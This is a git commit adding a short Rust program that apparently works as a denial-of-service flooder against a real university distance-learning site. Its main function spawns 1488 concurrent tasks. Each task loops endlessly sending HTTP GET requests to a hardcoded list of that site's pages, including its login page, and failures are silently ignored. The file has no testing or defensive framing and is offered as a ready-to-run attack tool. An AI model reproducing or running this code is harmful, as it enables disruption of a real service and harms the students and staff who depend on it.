d9a12372d81593bbbc5faa2a663d7a476a59dfe1
Sigma1337 <Sigma1337@Sigmaputer.localdomain>
2024-11-21 09:28:52 +0300

    intial commit
    This is start base version of the project

---
+++ src/main.rs
@@ -0,0 +1,58 @@
+use reqwest::Client;
+use std::sync::Arc;
+
+struct Ebatel {
+    urls: Vec<String>,
+    client: Client,
+}
+
+impl Ebatel {
+    fn new() -> Ebatel {
+        Ebatel {
+            urls: vec![
+                "https://dl-hum.spbstu.ru/".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=441".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=445".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=439".to_owned(),
+                "https://dl-hum.spbstu.ru/my/".to_owned(),
+                "https://dl-hum.spbstu.ru/calendar/view.php?view=month".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=438".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=4".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=333".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=329".to_owned(),
+                "https://dl-hum.spbstu.ru/course/index.php?categoryid=328".to_owned(),
+                "https://dl-hum.spbstu.ru/login/index.php".to_owned(),
+            ],
+            client: Client::new(),
+        }
+    }
+
+    async fn spam(self: Arc<Self>) {
+        loop {
+            let ind = fastrand::usize(0..self.urls.len());
+            let url = self.urls[ind].clone();
+            match self.client.get(url).send().await {
+                Ok(_) => println!("req was sended"),
+                Err(_) => { /* println!("err: {err}") */ }
+            }
+        }
+    }
+
+    async fn trahat() {
+        let mut handles = Vec::new();
+        let eba = Arc::new(Self::new());
+        for _ in 0..1488 {
+            let e = eba.clone();
+            handles.push(tokio::spawn(async move { e.spam().await }));
+        }
+
+        for handle in handles {
+            let _ = handle.await;
+        }
+    }
+}
+
+#[tokio::main]
+async fn main() {
+    Ebatel::trahat().await;
+}
